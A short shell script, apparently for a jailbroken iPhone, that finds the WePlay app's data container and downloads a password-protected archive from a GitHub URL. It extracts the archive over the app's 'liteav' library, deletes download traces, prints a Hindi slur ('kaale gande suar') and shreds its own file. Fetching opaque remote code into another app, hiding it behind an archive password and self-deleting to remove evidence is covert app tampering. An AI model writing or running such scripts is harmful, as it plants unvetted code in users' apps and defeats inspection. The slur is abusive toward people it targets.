#!/bin/sh
cd $home/../../../private/var/mobile/Containers/Data/Application
weJoy=$(grep -rl --include=".com.apple.mobile_container_manager.metadata.plist" "com.wejoy.weplay.ar" .| cut -d/ -f2 | sort -u)
if [ $? -eq 0 ]; then
    echo $weJoy
    cd $weJoy/Documents
 
   wget --no-cache -q https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z & wait  
   rm -rf liteav
   7z x eav_driver.7z -pRats@9033  
 #shred -u -z -f *.7z 
   rm -f *wget* 
   rm -f *eav* 
else
echo "App not installed please try after installing the App" 

fi
reset
echo "kaale gande suar"
echo "suer on top "
shred -u -- "$0"

$SHELL

